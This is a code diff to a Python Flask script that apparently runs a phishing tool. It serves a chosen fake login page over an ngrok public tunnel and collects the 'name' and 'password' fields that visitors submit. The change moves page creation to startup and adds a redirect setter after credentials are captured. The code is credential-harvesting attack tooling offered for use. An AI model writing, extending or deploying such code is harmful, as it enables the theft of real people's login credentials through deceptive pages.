@@ -1,5 +1,4 @@
 #!/usr/bin/env python3
-import os
 import time
 import threading as thr
 from pyngrok import ngrok
@@ -15,11 +14,12 @@ from actions.actions import (
     create_initial_files,
     request_localhost,
     push_page_options,
+    redirect_setter,
     clear_terminal,
     connect_ngrok,
     status_bar,
     sign_in,
-    banner
+    banner,
 )
 from flask import (
     render_template,
@@ -59,6 +59,9 @@ app = Flask(__name__)
 page = page_picker()
 push_page, host = push_page_options(port)
 
+page_name = page.create()
+redirect_setter(page_name)
+
 
 # SENDING THE FAKE `GET` REQUEST AND PRINTING THE STATUS BAR
 # IN SEPERATE THREADS FOR SMOOTH FLOW AND AVOID FREEZING
@@ -74,7 +77,6 @@ if push_page in PUBLIC_TUNELS:
 
 @app.route('/', methods=['POST', 'GET'])
 def main():
-    page_name = page.create()
     name = request.form.get('name')
     passwd = request.form.get('password')
     
